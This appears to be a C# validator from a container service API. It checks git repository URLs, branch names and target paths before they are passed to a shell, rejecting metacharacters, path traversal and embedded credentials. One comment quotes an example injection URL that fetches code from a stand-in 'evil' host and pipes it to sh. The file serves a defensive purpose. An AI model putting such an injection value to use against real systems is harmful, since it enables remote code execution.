using System.Text.RegularExpressions;
using Andy.Containers.Abstractions;

namespace Andy.Containers.Api.Services;

public static partial class GitRepositoryValidator
{
    // Metacharacters that have meaning in /bin/sh. We reject these in URLs,
    // branches, and target paths so they cannot escape from any quoting we apply
    // before passing the value into `sh -c`.
    private static readonly Regex ShellMetaChars = ShellMetaCharsRegex();
    private static readonly Regex InvalidBranchChars = InvalidBranchCharsRegex();

    private const int MaxUrlLength = 2048;
    private const int MaxBranchLength = 256;
    private const int MaxTargetPathLength = 1024;

    public static List<string> Validate(GitRepositoryConfig config)
    {
        var errors = new List<string>();

        if (string.IsNullOrWhiteSpace(config.Url))
        {
            errors.Add("Repository URL is required");
            return errors;
        }

        if (config.Url.Length > MaxUrlLength)
        {
            errors.Add($"Repository URL exceeds maximum length of {MaxUrlLength} characters");
            return errors;
        }

        // Check URL scheme
        if (!config.Url.StartsWith("https://", StringComparison.OrdinalIgnoreCase) &&
            !config.Url.StartsWith("git@", StringComparison.OrdinalIgnoreCase))
        {
            errors.Add("Only https:// and git@ URL schemes are allowed");
        }

        // Reject shell metacharacters anywhere in the URL. The clone is exec'd
        // through `sh -c`, so a URL like `git@host:/tmp';curl evil|sh;'` would
        // otherwise inject arbitrary shell.
        if (ShellMetaChars.IsMatch(config.Url))
        {
            errors.Add("Repository URL contains characters that are not allowed");
        }

        // Reject embedded credentials in URL
        if (config.Url.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
        {
            try
            {
                var uri = new Uri(config.Url);
                if (!string.IsNullOrEmpty(uri.UserInfo))
                {
                    errors.Add("Embedded credentials in URLs are not allowed. Use a credential reference instead");
                }
            }
            catch (UriFormatException)
            {
                errors.Add("Repository URL is not a valid URI");
            }
        }

        // Validate target path (no path traversal, no shell metacharacters)
        if (!string.IsNullOrEmpty(config.TargetPath))
        {
            if (config.TargetPath.Length > MaxTargetPathLength)
            {
                errors.Add($"Target path exceeds maximum length of {MaxTargetPathLength} characters");
            }
            else
            {
                var normalized = config.TargetPath.Replace('\\', '/');
                if (normalized.Contains("..") ||
                    normalized.Contains("~") ||
                    (!normalized.StartsWith('/') && !normalized.StartsWith("./")))
                {
                    errors.Add("Target path must be absolute and cannot contain path traversal sequences");
                }
                if (ShellMetaChars.IsMatch(config.TargetPath))
                {
                    errors.Add("Target path contains characters that are not allowed");
                }
            }
        }

        // Validate branch name (git check-ref-format-style) and reject shell metacharacters
        if (!string.IsNullOrEmpty(config.Branch))
        {
            if (config.Branch.Length > MaxBranchLength ||
                config.Branch.Contains("..") ||
                config.Branch.Contains(" ") ||
                config.Branch.EndsWith('.') ||
                config.Branch.EndsWith('/') ||
                config.Branch.StartsWith('-') ||
                config.Branch.Contains("\\") ||
                InvalidBranchChars.IsMatch(config.Branch) ||
                ShellMetaChars.IsMatch(config.Branch))
            {
                errors.Add("Invalid branch name");
            }
        }

        return errors;
    }

    public static List<string> ValidateAll(IEnumerable<GitRepositoryConfig> configs)
    {
        var errors = new List<string>();
        var index = 0;
        foreach (var config in configs)
        {
            var repoErrors = Validate(config);
            foreach (var error in repoErrors)
            {
                errors.Add($"Repository [{index}]: {error}");
            }
            index++;
        }
        return errors;
    }

    [GeneratedRegex(@"[\x00-\x1f\x7f~^:?*\[\\]")]
    private static partial Regex InvalidBranchCharsRegex();

    // Shell metacharacters: command separators, pipes, redirections, quotes,
    // expansions, escapes, globs, brace expansion, and whitespace.
    [GeneratedRegex(@"[;&|`$<>()\{\}\[\]\\""'\n\r\t *?!]")]
    private static partial Regex ShellMetaCharsRegex();
}
